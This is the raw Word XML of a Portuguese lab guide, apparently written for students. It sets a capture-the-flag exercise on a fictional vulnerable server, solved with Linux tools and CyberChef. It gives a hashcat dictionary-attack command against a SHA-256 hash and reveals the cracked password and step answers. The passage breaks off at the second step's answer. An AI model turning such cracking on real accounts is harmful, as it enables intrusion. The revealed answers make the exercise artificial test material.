    <w:p w14:paraId="198144BF" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Integrar comandos Linux com CyberChef para construir um processo de análise com criptografia simples.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F370A03" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2AB48515" wp14:editId="6A625111">
                <wp:extent cx="5943600" cy="19046"/>
                <wp:effectExtent l="0" t="0" r="0" b="0"/>
                <wp:docPr id="774634425" name="Horizontal Line 27"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="5943600" cy="19046"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln cap="flat">
                          <a:noFill/>
                          <a:prstDash val="solid"/>
                        </a:ln>
                      </wps:spPr>
                      <wps:bodyPr lIns="0" tIns="0" rIns="0" bIns="0"/>
                    </wps:wsp>
                  </a:graphicData>
                </a:graphic>
              </wp:inline>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:rect w14:anchorId="7A44CCD8" id="Horizontal Line 2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" filled="f" stroked="f">
                <v:textbox inset="0,0,0,0"/>
                <w10:anchorlock/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D87D886" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="114" w:name="_Toc213874724"/>
      <w:bookmarkStart w:id="115" w:name="_Toc213881922"/>
      <w:r>
        <w:t>Pré-requisitos</w:t>
      </w:r>
      <w:bookmarkEnd w:id="114"/>
      <w:bookmarkEnd w:id="115"/>
    </w:p>
    <w:p w14:paraId="6F8A78CC" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Máquina Linux (ou WSL). Distribuições baseadas em Debian/Ubuntu são recomendadas se o utilizador não usar Linux regularmente. A máquina disponibilizada online não permite instalações.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E492E6F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>CyberChef disponível (opções: usar a versão web oficial, ou instalar localmente via Docker / download do HTML). Recomenda-se dar download o HTML e abrir localmente para praticar.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="488729C5" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Ferramentas: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>hash-identifier</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>xxd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>hexdump</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>file</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>strings</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>base64</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>openssl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>md5sum</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sha1sum</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cut</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>tr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>grep</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="045A556B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Citao"/>
        <w:rPr>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Instalação rápida (Ubuntu/Debian):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="188B9E19" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Quote1"/>
      </w:pPr>
      <w:r>
        <w:t>sudo apt update</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>sudo apt install -y python3-pip xxd bsdmainutils coreutils binutils file strings</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>pip3 install hash-identifier</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t># opcional: sudo apt install hashcat</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F3CEFB6" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="58CCDC3B" wp14:editId="4629A238">
                <wp:extent cx="5943600" cy="19046"/>
                <wp:effectExtent l="0" t="0" r="0" b="0"/>
                <wp:docPr id="1907391550" name="Horizontal Line 28"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="5943600" cy="19046"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln cap="flat">
                          <a:noFill/>
                          <a:prstDash val="solid"/>
                        </a:ln>
                      </wps:spPr>
                      <wps:bodyPr lIns="0" tIns="0" rIns="0" bIns="0"/>
                    </wps:wsp>
                  </a:graphicData>
                </a:graphic>
              </wp:inline>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:rect w14:anchorId="649863E1" id="Horizontal Line 28"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" filled="f" stroked="f">
                <v:textbox inset="0,0,0,0"/>
                <w10:anchorlock/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FC4EFA9" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="116" w:name="_Toc213874725"/>
      <w:bookmarkStart w:id="117" w:name="_Toc213881923"/>
      <w:r>
        <w:t>Contexto fornecido:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="116"/>
      <w:bookmarkEnd w:id="117"/>
    </w:p>
    <w:p w14:paraId="612AF85D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Citao"/>
        <w:rPr>
          <w:i w:val="0"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i w:val="0"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Neste fim de semana existiu uma pequena zeroday e um dos servidores da empresa Antixerox ficou vulnerável, tu, hacker mafarrico, tens o objetivo de tomar o controlo do servidor! Acede ao website para começar:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4886FD0C" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="7DA69976" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Aconselhamos vividamente a fazer o lab através do markdown do github já que o docx remove todas as opções de hidden content como riddles, hints e answers, então, se queres realmente usufruir do lab ao máximo sem spoilers, acede ao nosso github!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B5A377A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="4F0F4E03" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Citao"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:rPr>
          <w:i w:val="0"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i w:val="0"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>O site está feito e funcional, mas o hosting acabou, caso o professor queira explorar o site, envie-nos um ping no discord ou um email que nós iniciamos uma pequena instância na azure, ainda assim, o código do site está todo no github se o professor quiser fazer em localhost.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1930AB53" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="46410F91" wp14:editId="48FF039E">
                <wp:extent cx="5943600" cy="19046"/>
                <wp:effectExtent l="0" t="0" r="0" b="0"/>
                <wp:docPr id="1872918357" name="Horizontal Line 29"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="5943600" cy="19046"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln cap="flat">
                          <a:noFill/>
                          <a:prstDash val="solid"/>
                        </a:ln>
                      </wps:spPr>
                      <wps:bodyPr lIns="0" tIns="0" rIns="0" bIns="0"/>
                    </wps:wsp>
                  </a:graphicData>
                </a:graphic>
              </wp:inline>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:rect w14:anchorId="3107EB37" id="Horizontal Line 2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" filled="f" stroked="f">
                <v:textbox inset="0,0,0,0"/>
                <w10:anchorlock/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B2947A5" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="118" w:name="_Toc213874726"/>
      <w:bookmarkStart w:id="119" w:name="_Toc213881924"/>
      <w:r>
        <w:t>Passo 1:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="118"/>
      <w:bookmarkEnd w:id="119"/>
    </w:p>
    <w:p w14:paraId="79AE837E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Recon time! Identifica os ficheiros da pasta em que te encontras no momento, cuidado com os ficheiros ocultos!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36F77109" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Citao"/>
        <w:rPr>
          <w:i w:val="0"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i w:val="0"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Encontraste alguma coisa? Se sim, sabes o que fazer. Descriptografa o conteúdo do que encontraste e passa para o próximo passo!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DB82E46" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="2DD422A0" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Riddle </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E411CE1" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Transformo bytes em letras que se entendem,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62FDCBE3" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Uso 64 símbolos e às vezes deixo um = no final.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D83AFBD" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Ainda tens dúvidas de quem eu sou?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FF9AB31" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Hint</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28296639" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Have you ever used hashcat? </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57435014" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Answer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C63F205" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Usa </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode3"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        </w:rPr>
        <w:t>ls -la</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> para listar todos os ficheiros que estão na pasta em que logaste, incluíndo os ocultos. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>De seguida, cracka a hash com o hashcat.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31489318" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode3"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>hashcat -m 1400 -a 0 hashes.txt /path/to/wordlist.txt -o found.txt -w 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="483FBB10" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Citao"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode3"/>
          <w:i w:val="0"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>-m 1400 = SHA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode3"/>
          <w:rFonts w:ascii="Cambria Math" w:hAnsi="Cambria Math" w:cs="Cambria Math"/>
          <w:i w:val="0"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:noBreakHyphen/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode3"/>
          <w:i w:val="0"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>256 (raw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FF82942" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Citao"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode3"/>
          <w:i w:val="0"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>-a 0 = ataque por dicionário (dictionary attack)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E5397A6" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Citao"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode3"/>
          <w:i w:val="0"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>-w 3 = perfil de workload agressivo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67EDB0DD" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">Password: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode3"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        </w:rPr>
        <w:t>9ae3ebf2e993b0debfb5b87d9e22e404216f436f35757f8992a367d41f0cde32 - boilerplate</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24A70E57" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="120" w:name="_Toc213874727"/>
      <w:bookmarkStart w:id="121" w:name="_Toc213881925"/>
      <w:r>
        <w:t>Passo 2:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="120"/>
      <w:bookmarkEnd w:id="121"/>
    </w:p>
    <w:p w14:paraId="37DDE357" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Se ainda não trocaste de utilizador com a password que encontraste, agora é a hora.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5667623C" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Explora a pasta deste novo utilizador, há ficheiros que apenas podes visualizar na tua máquina, usa o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode3"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        </w:rPr>
        <w:t>get [ficheiro]</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> para o transferires para a tua máquina.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57308BA3" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Verifica o ficheiro com o comando </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode3"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        </w:rPr>
        <w:t>strings</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode3"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        </w:rPr>
        <w:t>xxd</w:t>
      </w:r>
      <w:r>
        <w:t>. A que conclusões chegaste?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C69BF02" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Com a informação que obtiveste, utiliza o cyberchef para desencriptar a string, cria uma receita para facilitar o processo.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FD1A4E9" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Riddle</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B08225" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Xerox mostra pixels, mas guarda papel.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="167D96E4" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Troca a extensão e encontras a pass do Samuel.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B126D4F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Hint</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CF870A7" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">Vamos da base mais baixa até à mais alta! </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22068160" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Answer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E9DF705" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
